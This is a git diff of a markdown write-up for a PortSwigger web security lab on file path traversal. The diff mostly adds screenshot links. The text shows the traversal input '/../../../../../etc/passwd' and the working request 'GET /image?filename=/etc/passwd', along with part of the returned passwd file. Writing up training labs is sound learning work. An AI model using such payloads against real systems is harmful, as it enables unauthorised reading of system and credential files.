@@ -1,6 +1,6 @@
 ## Lab Description :
 
-
+![image](https://github.com/eeugenewyj/Portswigger_Labs/blob/main/assets/Screenshot%202026-01-29%20130435.png)
 
 ## Solution :
 
@@ -25,7 +25,9 @@ Te: trailers
 ```
 
 We attempt to use the previous lab's path `/../../../../../etc/passwd` and the lab returns with `"No such file"`
+
 Slowly remove each `/../` to identify the correct absolute path.
+
 Finally, this GET request `GET /image?filename=/etc/passwd HTTP/2` returns the contents of `/etc/passwd` that we are interested in.
 
 ```
@@ -77,3 +79,4 @@ pulse:x:116:124:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
 gdm:x:117:126:Gnome Display Manager:/var/lib/gdm3:/bin/false
 ```
 
+![image](https://github.com/eeugenewyj/Portswigger_Labs/blob/main/assets/Screenshot%202026-01-29%20131851.png)
